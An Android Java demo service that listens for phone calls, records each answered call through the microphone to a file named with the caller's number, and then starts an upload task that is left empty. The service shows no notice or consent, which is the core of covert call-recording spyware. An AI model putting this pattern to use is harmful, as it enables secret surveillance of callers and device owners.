package com.example.demo2;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.File;

/**
 * Created by Administrator on 2016/7/28.
 */
public class PhoneListenService extends Service {
    private static final String TAG = "PhoneListener";
    @Override
    public void onCreate() {
        TelephonyManager telManager = (TelephonyManager)this.getSystemService(Context.TELEPHONY_SERVICE);
        telManager.listen(new TelListener(), PhoneStateListener.LISTEN_CALL_STATE);
        Log.i(TAG, "service created");
        super.onCreate();
    }

    @Override
    public void onDestroy() {
        //清空缓存目录下的所有文件
        File[] files = getCacheDir().listFiles();
        if(files != null){
            for(File f : files ){
                f.delete();
            }
        }
        Log.i(TAG, "service destroy");
        super.onDestroy();
    }

    private class TelListener extends PhoneStateListener{

        private MediaRecorder recorder;
        private String mobile;
        private File audioFile;
        private boolean record;

        @Override
        public void onCallStateChanged(int state, String incomingNumber) {
            try{
                switch (state) {
                    case TelephonyManager.CALL_STATE_IDLE: //无任何状态时
                        if(record){
                            recorder.stop(); //停止刻录
                            recorder.release(); //释放资源
                            record = false;
                            new Thread(new UploadTask()).start();  //将录音文件上传
                        }
                        System.out.println("无状态");
                        break;
                    case TelephonyManager.CALL_STATE_OFFHOOK: //接起电话时
                        recorder = new MediaRecorder();
                        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);//从麦克风采集声音
                        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP); //内容输出格式
                        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);//音频编码方式
                        audioFile = new File(getCacheDir(), incomingNumber + "_" + System.currentTimeMillis() + ".3gp");
                        recorder.setOutputFile(audioFile.getAbsolutePath());
                        recorder.prepare(); //预期准备
                        recorder.start(); //开始刻录
                        record = true;
                        Log.i(TAG, "start record");
                        System.out.println("响铃中");
                        break;
                    case TelephonyManager.CALL_STATE_RINGING: //电话进来时
                        mobile = incomingNumber;
                        Log.i(TAG, incomingNumber + " coming");
                        System.out.println("接听中");
                        break;

                    default:
                        break;

                }
            }catch (Exception e) {
                e.printStackTrace();
            }
            super.onCallStateChanged(state, incomingNumber);
        }

    }

    private final class UploadTask implements Runnable{

        @Override
        public void run() {
            //上传文件操作
        }

    }


    @Override
    public IBinder onBind(Intent intent) {
        // TODO Auto-generated method stub
        return null;
    }

}

